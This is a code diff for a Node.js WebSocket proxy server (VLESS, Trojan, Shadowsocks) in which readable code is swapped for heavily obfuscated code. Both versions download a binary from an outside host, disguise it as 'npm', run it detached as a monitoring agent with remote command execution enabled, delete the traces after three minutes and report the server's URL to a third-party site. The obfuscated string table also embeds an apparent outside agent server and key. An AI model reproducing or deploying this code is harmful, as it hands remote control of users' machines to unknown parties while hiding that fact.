+    if (_0x282345 === 0x1) ((_0x5bae4f = _0x2c4bb2['slice'](_0x4fc053, _0x4fc053 + 0x4)['join']('.')), (_0x4fc053 += 0x4))
+    else {
+      if (_0x282345 === 0x3) {
+        const _0x576842 = _0x2c4bb2[_0x4fc053]
+        ;((_0x4fc053 += 0x1), (_0x5bae4f = _0x2c4bb2[_0x445b6e(0x191)](_0x4fc053, _0x4fc053 + _0x576842)['toString']()), (_0x4fc053 += _0x576842))
+      } else {
+        if (_0x282345 === 0x4)
+          ((_0x5bae4f = _0x2c4bb2['slice'](_0x4fc053, _0x4fc053 + 0x10)
+            [_0x445b6e(0x149)](
+              (_0x52b9ef, _0x10764c, _0x480cba, _0x5863db) =>
+                _0x480cba % 0x2 ? _0x52b9ef['concat'](_0x5863db['slice'](_0x480cba - 0x1, _0x480cba + 0x1)) : _0x52b9ef,
+              []
+            )
+            [_0x445b6e(0x1b7)]((_0x7902bd) => _0x7902bd[_0x445b6e(0x1a2)](0x0)[_0x445b6e(0x12c)](0x10))
+            [_0x445b6e(_0x14afcc._0x2518c3)](':')),
+            (_0x4fc053 += 0x10))
+        else return ![]
       }
     }
-    // tro-jan (56 bytes SHA224 hash)
-    if (msg.length >= 58) {
-      if (handleTrojConnection(ws, msg)) {
-        return
-      }
-    }
-    // SS (ATYP开头: 0x01, 0x03, 0x04)
-    if (msg.length > 0 && (msg[0] === 0x01 || msg[0] === 0x03 || msg[0] === 0x04)) {
-      if (handleSsConnection(ws, msg)) {
-        return
-      }
-    }
-
-    ws.close()
-  }).on('error', () => {})
-})
-
-const getDownloadUrl = () => {
-  const arch = os.arch()
-  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
-    if (!NEZHA_PORT) {
-      return 'https://arm64.ssss.nyc.mn/v1'
-    } else {
-      return 'https://arm64.ssss.nyc.mn/agent'
-    }
-  } else {
-    if (!NEZHA_PORT) {
-      return 'https://amd64.ssss.nyc.mn/v1'
-    } else {
-      return 'https://amd64.ssss.nyc.mn/agent'
-    }
-  }
-}
-
-const downloadFile = async () => {
-  if (!NEZHA_SERVER && !NEZHA_KEY) return
-
-  try {
-    const url = getDownloadUrl()
-    const response = await axios({
-      method: 'get',
-      url: url,
-      responseType: 'stream'
-    })
-
-    const writer = fs.createWriteStream('npm')
-    response.data.pipe(writer)
-
-    return new Promise((resolve, reject) => {
-      writer.on('finish', () => {
-        console.log('npm download successfully')
-        exec('chmod +x npm', (err) => {
-          if (err) reject(err)
-          resolve()
+    ;((_0x1e68bb = _0x2c4bb2['readUInt16BE'](_0x4fc053)), (_0x4fc053 += 0x2))
+    _0x4fc053 < _0x2c4bb2[_0x445b6e(0x152)] && _0x2c4bb2[_0x4fc053] === 0xd && _0x2c4bb2[_0x4fc053 + 0x1] === 0xa && (_0x4fc053 += 0x2)
+    if (isBlockedDomain(_0x5bae4f)) return (_0x4e0fc2[_0x445b6e(_0x14afcc._0x48d810)](), ![])
+    const _0x4c98c2 = createWebSocketStream(_0x4e0fc2)
+    return (
+      resolveHost(_0x5bae4f)
+        [_0x445b6e(_0x14afcc._0x45b380)]((_0x1825d3) => {
+          const _0x237a6a = _0x445b6e
+          net[_0x237a6a(_0x19aeac._0x341476)]({ host: _0x1825d3, port: _0x1e68bb }, function () {
+            const _0x3348f2 = _0x237a6a
+            ;(_0x4fc053 < _0x2c4bb2[_0x3348f2(_0x634c8._0x4b715f)] && this['write'](_0x2c4bb2['slice'](_0x4fc053)),
+              _0x4c98c2['on'](_0x3348f2(0x169), () => {})
+                [_0x3348f2(_0x634c8._0x3e2492)](this)
+                ['on']('error', () => {})
+                [_0x3348f2(_0x634c8._0x4b4e39)](_0x4c98c2))
+          })['on'](_0x237a6a(_0x19aeac._0x1cb819), () => {})
         })
-      })
-      writer.on('error', reject)
-    })
-  } catch (err) {
-    throw err
-  }
-}
-
-const runnz = async () => {
-  try {
-    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' })
-    if (status.trim() !== '') {
-      console.log('npm is already running, skip running...')
-      return
-    }
-  } catch (e) {
-    // 进程不存在时继续运行nezha
-  }
-
-  await downloadFile()
-  let command = ''
-  let tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053']
-  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
-    const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : ''
-    command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`
-  } else if (NEZHA_SERVER && NEZHA_KEY) {
-    if (!NEZHA_PORT) {
-      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : ''
-      const NZ_TLS = tlsPorts.includes(port) ? 'true' : 'false'
-      const configYaml = `client_secret: ${NEZHA_KEY}
-debug: false
-disable_auto_update: true
-disable_command_execute: false
-disable_force_update: true
-disable_nat: false
-disable_send_query: false
-gpu: false
-insecure_tls: true
-ip_report_period: 1800
-report_delay: 4
-server: ${NEZHA_SERVER}
-skip_connection_count: true
-skip_procs_count: true
-temperature: false
-tls: ${NZ_TLS}
-use_gitee_to_upgrade: false
-use_ipv6_country_code: false
-uuid: ${UUID}`
-
-      fs.writeFileSync('config.yaml', configYaml)
-    }
-    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`
-  } else {
-    // console.log('NEZHA variable is empty, skip running');
-    return
-  }
-
-  try {
-    exec(command, { shell: '/bin/bash' }, (err) => {
-      if (err) console.error('npm running error:', err)
-      else console.log('npm is running')
-    })
-  } catch (error) {
-    console.error(`error: ${error}`)
-  }
-}
-
-async function addAccessTask() {
-  if (!AUTO_ACCESS) return
-
-  if (!DOMAIN) {
-    return
-  }
-  const fullURL = `https://${DOMAIN}/${SUB_PATH}`
-  try {
-    const res = await axios.post(
-      'https://oooo.serv00.net/add-url',
-      {
-        url: fullURL
-      },
-      {
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      }
+        ['catch']((_0x5aba61) => {
+          const _0x5412e6 = { _0x5a93d6: 0x18c, _0x4d1b1c: 0x1b6 },
+            _0x26788f = _0x445b6e
+          net[_0x26788f(_0x44ee33._0xf307e1)]({ host: _0x5bae4f, port: _0x1e68bb }, function () {
+            const _0x5f203b = _0x26788f
+            ;(_0x4fc053 < _0x2c4bb2['length'] && this[_0x5f203b(_0x5412e6._0x5a93d6)](_0x2c4bb2[_0x5f203b(0x191)](_0x4fc053)),
+              _0x4c98c2['on'](_0x5f203b(0x169), () => {})
+                [_0x5f203b(0x1b6)](this)
+                ['on'](_0x5f203b(0x169), () => {})
+                [_0x5f203b(_0x5412e6._0x4d1b1c)](_0x4c98c2))
+          })['on'](_0x26788f(_0x44ee33._0x3fba65), () => {})
+        }),
+      !![]
     )
-    console.log('Automatic Access Task added successfully')
-  } catch (error) {
-    // console.error('Error adding Task:', error.message);
+  } catch (_0x5246df) {
+    return ![]
   }
 }
-
-const delFiles = () => {
-  ;['npm', 'config.yaml'].forEach((file) => fs.unlink(file, () => {}))
+function handleSsConnection(_0x4bd26c, _0x1583c7) {
+  const _0x16937c = { _0x1b9d6b: 0x191, _0x12622e: 0x16d, _0x4541d9: 0x12c, _0x52a9ed: 0x191, _0x5f3509: 0x1b7, _0xdc950f: 0x16d, _0x14c89d: 0x162 },
+    _0x18c6d0 = { _0x383ad6: 0x1b6, _0x5b6261: 0x169 },
+    _0x5942b0 = { _0x178c7e: 0x134 },
+    _0x5607cf = _0x15bbba
+  try {
+    let _0x24e48d = 0x0
+    const _0x56adae = _0x1583c7[_0x24e48d]
+    _0x24e48d += 0x1
+    let _0x1683cf, _0x3c429b
+    if (_0x56adae === 0x1)
+      ((_0x1683cf = _0x1583c7[_0x5607cf(_0x16937c._0x1b9d6b)](_0x24e48d, _0x24e48d + 0x4)[_0x5607cf(_0x16937c._0x12622e)]('.')), (_0x24e48d += 0x4))
+    else {
+      if (_0x56adae === 0x3) {
+        const _0x4ea8a4 = _0x1583c7[_0x24e48d]
+        ;((_0x24e48d += 0x1),
+          (_0x1683cf = _0x1583c7[_0x5607cf(0x191)](_0x24e48d, _0x24e48d + _0x4ea8a4)[_0x5607cf(_0x16937c._0x4541d9)]()),
+          (_0x24e48d += _0x4ea8a4))
+      } else {
+        if (_0x56adae === 0x4)
+          ((_0x1683cf = _0x1583c7[_0x5607cf(_0x16937c._0x52a9ed)](_0x24e48d, _0x24e48d + 0x10)
+            [_0x5607cf(0x149)](
+              (_0x471a16, _0xc7960a, _0x5b72d0, _0x4eaa23) =>
+                _0x5b72d0 % 0x2 ? _0x471a16[_0x5607cf(0x19a)](_0x4eaa23['slice'](_0x5b72d0 - 0x1, _0x5b72d0 + 0x1)) : _0x471a16,
+              []
+            )
+            [_0x5607cf(_0x16937c._0x5f3509)]((_0x39a1d1) => _0x39a1d1['readUInt16BE'](0x0)[_0x5607cf(0x12c)](0x10))
+            [_0x5607cf(_0x16937c._0xdc950f)](':')),
+            (_0x24e48d += 0x10))
+        else return ![]
+      }
+    }
+    ;((_0x3c429b = _0x1583c7[_0x5607cf(0x1a2)](_0x24e48d)), (_0x24e48d += 0x2))
+    if (isBlockedDomain(_0x1683cf)) return (_0x4bd26c[_0x5607cf(_0x16937c._0x14c89d)](), ![])
+    const _0x2acd78 = createWebSocketStream(_0x4bd26c)
+    return (
+      resolveHost(_0x1683cf)
+        [_0x5607cf(0x18b)]((_0x2239c4) => {
+          const _0x3eec18 = { _0x404610: 0x152, _0x272f27: 0x18c },
+            _0x5347f8 = _0x5607cf
+          net[_0x5347f8(_0x5942b0._0x178c7e)]({ host: _0x2239c4, port: _0x3c429b }, function () {
+            const _0x5bd263 = _0x5347f8
+            ;(_0x24e48d < _0x1583c7[_0x5bd263(_0x3eec18._0x404610)] && this[_0x5bd263(_0x3eec18._0x272f27)](_0x1583c7['slice'](_0x24e48d)),
+              _0x2acd78['on'](_0x5bd263(0x169), () => {})
+                ['pipe'](this)
+                ['on']('error', () => {})
+                ['pipe'](_0x2acd78))
+          })['on'](_0x5347f8(0x169), () => {})
+        })
+        [_0x5607cf(0x137)]((_0x34263) => {
+          const _0x1a070f = _0x5607cf
+          net['connect']({ host: _0x1683cf, port: _0x3c429b }, function () {
+            const _0x1f425c = _0xb66c
+            ;(_0x24e48d < _0x1583c7[_0x1f425c(0x152)] && this[_0x1f425c(0x18c)](_0x1583c7[_0x1f425c(0x191)](_0x24e48d)),
+              _0x2acd78['on'](_0x1f425c(0x169), () => {})
+                [_0x1f425c(_0x18c6d0._0x383ad6)](this)
+                ['on'](_0x1f425c(_0x18c6d0._0x5b6261), () => {})
+                ['pipe'](_0x2acd78))
+          })['on'](_0x1a070f(0x169), () => {})
+        }),
+      !![]
+    )
+  } catch (_0x3c95ab) {
+    return ![]
+  }
 }
-
-httpServer.listen(PORT, () => {
-  runnz()
-  setTimeout(() => {
-    delFiles()
-  }, 180000)
-  addAccessTask()
-  console.log(`Server is running on port ${PORT}`)
+const wss = new WebSocket['Server']({ server: httpServer })
+function _0x8986() {
+  const _0x47c527 = [
+    'error:\x20',
+    'speedof.me',
+    'SERVER_PORT',
+    '88LJkSZT',
+    'base64',
+    'net',
+    'NEZHA_PORT',
+    'arm',
+    'trim',
+    'npm\x20is\x20running',
+    'none:',
+    'toString',
+    'setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&',
+    'vless://',
+    '8443',
+    'url',
+    'text/plain',
+    'axios',
+    '--tls',
+    'connect',
+    '36744wsJRrV',
+    'end',
+    'catch',
+    '127VGRint',
+    'send',
+    'startsWith',
+    '\x20with\x20all\x20DNS\x20servers',
+    'npm\x20download\x20successfully',
+    'readUInt8',
+    'https://dns.google/resolve?name=',
+    'setsid\x20nohup\x20./npm\x20-s\x20',
+    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
+    'https://arm64.ssss.nyc.mn/agent',
+    'createHash',
+    '14nStmNt',
+    'sha224',
+    ';path%3D%2F',
+    'https://oooo.serv00.net/add-url',
+    'createServer',
+    'text/html',
+    'reduce',
+    'arch',
+    'every',
+    'Hello\x20world!',
+    'NEZHA_KEY',
+    'nezha.933993.xyz:443',
+    'https://amd64.ssss.nyc.mn/agent',
+    '1704800OXunYC',
+    'get',
+    'length',
+    'trojan://',
+    'https://arm64.ssss.nyc.mn/v1',
+    'buffer',
+    'config.yaml',
+    'split',
+    'your-domain.com',
+    'npm\x20is\x20already\x20running,\x20skip\x20running...',
+    'path',
+    'false',
+    'arm64',
+    'tls',
+    'Mozilla/5.0',
+    'true',
+    'Answer',
+    '5536PxtgxO',
+    'close',
+    'e18d5155-c6c5-4e81-aa89-09e204fd07d4',
+    'digest',
+    'speed.cloudflare.com',
+    '8.8.4.4',
+    'sni%3D',
+    'https://api-ipv4.ip.sb/ip',
+    'error',
+    'cahnge-your-domain.com',
+    'testmy.net',
+    'createWriteStream',
+    'join',
+    'replace',
+    'includes',
+    'message',
+    'tls;',
+    'finish',
+    'js-node',
+    '2083',
+    'speedcheck.org',
+    'application/dns-json',
+    '?security=',
+    'writeHead',
+    'data',
+    '51950ezEVVr',
+    'WSPATH',
+    'aarch64',
+    'crypto',
+    '?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D',
+    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
+    'speed.io',
+    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
+    'child_process',
+    'forEach',
+    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
+    'DOMAIN',
+    '?encryption=none&security=',
+    '2053',
+    'post',
+    'toLowerCase',
+    'env',
+    'then',
+    'write',
+    'stream',
+    'once',
+    'from',
+    'Failed\x20to\x20get\x20IP',
+    'slice',
+    'none',
+    'chmod\x20+x\x20npm',
+    '242OtLRXI',
+    '3073095XRpQsm',
+    'https://api.ip.sb/geoip',
+    'NAME',
+    'writeFileSync',
+    'Automatic\x20Access\x20Task\x20added\x20successfully',
+    'concat',
+    '\x20-p\x20',
+    'Unknown',
+    'npm',
+    'decode',
+    '&fp=chrome&type=ws&host=',
+    'client_secret:\x20',
+    'http',
+    'readUInt16BE',
+    'librespeed.org',
+    'http://ip-api.com/json',
+    '&sni=',
+    '443',
+    'readFile',
+    'log',
+    'substr',
+    '&path=%2F',
+    'hex',
+    'utf-8',
+    '54690bOlKSi',
+    'AUTO_ACCESS',
+    '/bin/bash',
+    'ss://',
+    'index.html',
+    'type',
+    'Server\x20is\x20running\x20on\x20port\x20',
+    'some',
+    '3150752UdujOu',
+    'pipe',
+    'map'
+  ]
+  _0x8986 = function () {
+    return _0x47c527
+  }
+  return _0x8986()
+}
+wss['on']('connection', (_0x11f0bc, _0x4688fd) => {
+  const _0x558d01 = { _0x574c5b: 0x13a, _0x11af63: 0x18e },
+    _0x577540 = { _0x57b771: 0x162 },
+    _0x1793e8 = _0x15bbba,
+    _0x5692aa = _0x4688fd['url'] || '',
+    _0x5719e3 = '/' + WSPATH
+  if (!_0x5692aa[_0x1793e8(_0x558d01._0x574c5b)](_0x5719e3)) {
+    _0x11f0bc[_0x1793e8(0x162)]()
+    return
+  }
+  _0x11f0bc[_0x1793e8(_0x558d01._0x11af63)]('message', (_0x2238d5) => {
+    const _0x1911bd = _0x1793e8
+    if (_0x2238d5['length'] > 0x11 && _0x2238d5[0x0] === 0x0) {
+      const _0x416d80 = _0x2238d5[_0x1911bd(0x191)](0x1, 0x11),
+        _0x4feb75 = _0x416d80[_0x1911bd(0x14b)]((_0x1dab7b, _0x2f5e40) => _0x1dab7b == parseInt(uuid[_0x1911bd(0x1a9)](_0x2f5e40 * 0x2, 0x2), 0x10))
+      if (_0x4feb75) {
+        !handleVlsConnection(_0x11f0bc, _0x2238d5) && _0x11f0bc[_0x1911bd(_0x577540._0x57b771)]()
+        return
+      }
+    }
+    if (_0x2238d5[_0x1911bd(0x152)] >= 0x3a) {
+      if (handleTrojConnection(_0x11f0bc, _0x2238d5)) return
+    }
+    if (_0x2238d5[_0x1911bd(0x152)] > 0x0 && (_0x2238d5[0x0] === 0x1 || _0x2238d5[0x0] === 0x3 || _0x2238d5[0x0] === 0x4)) {
+      if (handleSsConnection(_0x11f0bc, _0x2238d5)) return
+    }
+    _0x11f0bc['close']()
+  })['on']('error', () => {})
+})
+const getDownloadUrl = () => {
+    const _0xfc8c4e = { _0x4eb9a: 0x14a, _0x3af3ce: 0x1bf, _0x514256: 0x141, _0x463933: 0x14f },
+      _0x305a3e = _0x15bbba,
+      _0xba4c1c = os[_0x305a3e(_0xfc8c4e._0x4eb9a)]()
+    return _0xba4c1c === _0x305a3e(_0xfc8c4e._0x3af3ce) || _0xba4c1c === _0x305a3e(0x15c) || _0xba4c1c === _0x305a3e(0x17c)
+      ? !NEZHA_PORT
+        ? _0x305a3e(0x154)
+        : _0x305a3e(_0xfc8c4e._0x514256)
+      : !NEZHA_PORT
+        ? 'https://amd64.ssss.nyc.mn/v1'
+        : _0x305a3e(_0xfc8c4e._0x463933)
+  },
+  downloadFile = async () => {
+    const _0x4b97eb = { _0xbde5e1: 0x151, _0x33cb81: 0x18d, _0x236aa7: 0x16c },
+      _0x24512e = _0x15bbba
+    if (!NEZHA_SERVER && !NEZHA_KEY) return
+    try {
+      const _0xea5f91 = getDownloadUrl(),
+        _0x28f081 = await axios({ method: _0x24512e(_0x4b97eb._0xbde5e1), url: _0xea5f91, responseType: _0x24512e(_0x4b97eb._0x33cb81) }),
+        _0x1cc3ed = fs[_0x24512e(_0x4b97eb._0x236aa7)](_0x24512e(0x19d))
+      return (
+        _0x28f081['data'][_0x24512e(0x1b6)](_0x1cc3ed),
+        new Promise((_0xe92164, _0x2a3b54) => {
+          const _0x1dbc38 = { _0x58006f: 0x13c },
+            _0x8b65e = _0x24512e
+          ;(_0x1cc3ed['on'](_0x8b65e(0x172), () => {
+            const _0xc76a9 = _0x8b65e
+            ;(console['log'](_0xc76a9(_0x1dbc38._0x58006f)),
+              exec(_0xc76a9(0x193), (_0x63d563) => {
+                if (_0x63d563) _0x2a3b54(_0x63d563)
+                _0xe92164()
+              }))
+          }),
+            _0x1cc3ed['on']('error', _0x2a3b54))
+        })
+      )
+    } catch (_0x1d429a) {
+      throw _0x1d429a
+    }
+  },
+  runnz = async () => {
+    const _0x526d19 = {
+        _0x38748b: 0x1ac,
+        _0x56d5f5: 0x1c0,
+        _0x1adc03: 0x174,
+        _0xa6608a: 0x133,
+        _0xc9e700: 0x13f,
+        _0x112ba7: 0x181,
+        _0x348cfe: 0x157,
+        _0x205102: 0x1a0,
+        _0x135f96: 0x156,
+        _0x316552: 0x12d
+      },
+      _0x3ed251 = _0x15bbba
+    try {
+      const _0x5dd555 = execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22', {
+        encoding: _0x3ed251(_0x526d19._0x38748b)
+      })
+      if (_0x5dd555[_0x3ed251(_0x526d19._0x56d5f5)]() !== '') {
+        console['log'](_0x3ed251(0x159))
+        return
+      }
+    } catch (_0x35976d) {}
+    await downloadFile()
+    let _0x32999c = '',
+      _0x3e3858 = [_0x3ed251(0x1a6), _0x3ed251(0x12f), '2096', '2087', _0x3ed251(_0x526d19._0x1adc03), _0x3ed251(0x187)]
+    if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
+      const _0x5c58fe = _0x3e3858['includes'](NEZHA_PORT) ? _0x3ed251(_0x526d19._0xa6608a) : ''
+      _0x32999c =
+        _0x3ed251(_0x526d19._0xc9e700) +
+        NEZHA_SERVER +
+        ':' +
+        NEZHA_PORT +
+        _0x3ed251(0x19b) +
+        NEZHA_KEY +
+        '\x20' +
+        _0x5c58fe +
+        _0x3ed251(_0x526d19._0x112ba7)
+    } else {
+      if (NEZHA_SERVER && NEZHA_KEY) {
+        if (!NEZHA_PORT) {
+          const _0x3276cf = NEZHA_SERVER['includes'](':') ? NEZHA_SERVER[_0x3ed251(_0x526d19._0x348cfe)](':')['pop']() : '',
+            _0x56d74f = _0x3e3858[_0x3ed251(0x16f)](_0x3276cf) ? 'true' : _0x3ed251(0x15b),
+            _0x39df99 =
+              _0x3ed251(_0x526d19._0x205102) +
+              NEZHA_KEY +
+              _0x3ed251(0x184) +
+              NEZHA_SERVER +
+              '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20' +
+              _0x56d74f +
+              _0x3ed251(0x140) +
+              UUID
+          fs[_0x3ed251(0x198)](_0x3ed251(_0x526d19._0x135f96), _0x39df99)
+        }
+        _0x32999c = _0x3ed251(_0x526d19._0x316552)
+      } else return
+    }
+    try {
+      exec(_0x32999c, { shell: _0x3ed251(0x1af) }, (_0x5398bc) => {
+        const _0x1283ac = _0x3ed251
+        if (_0x5398bc) console['error']('npm\x20running\x20error:', _0x5398bc)
+        else console[_0x1283ac(0x1a8)](_0x1283ac(0x1c1))
+      })
+    } catch (_0x25037b) {
+      console['error'](_0x3ed251(0x1b8) + _0x25037b)
+    }
+  }
+async function addAccessTask() {
+  const _0x3040ff = { _0x488b74: 0x188, _0x2bfd5a: 0x1a8, _0x499ff7: 0x199 },
+    _0x26aca0 = _0x15bbba
+  if (!AUTO_ACCESS) return
+  if (!DOMAIN) return
+  const _0x440811 = 'https://' + DOMAIN + '/' + SUB_PATH
+  try {
+    const _0x336239 = await axios[_0x26aca0(_0x3040ff._0x488b74)](
+      _0x26aca0(0x146),
+      { url: _0x440811 },
+      { headers: { 'Content-Type': 'application/json' } }
+    )
+    console[_0x26aca0(_0x3040ff._0x2bfd5a)](_0x26aca0(_0x3040ff._0x499ff7))
+  } catch (_0x245f50) {}
+}
+const delFiles = () => {
+  const _0x39c821 = { _0x20e774: 0x156, _0x3246be: 0x183 },
+    _0x1af296 = _0x15bbba
+  ;[_0x1af296(0x19d), _0x1af296(_0x39c821._0x20e774)][_0x1af296(_0x39c821._0x3246be)]((_0x5c618d) => fs['unlink'](_0x5c618d, () => {}))
+}
+httpServer['listen'](PORT, () => {
+  const _0x4d7cc4 = { _0x10ce12: 0x1b3 },
+    _0x2f8b88 = _0x15bbba
+  ;(runnz(),
+    setTimeout(() => {
+      delFiles()
+    }, 0x2bf20),
+    addAccessTask(),
+    console['log'](_0x2f8b88(_0x4d7cc4._0x10ce12) + PORT))
 })
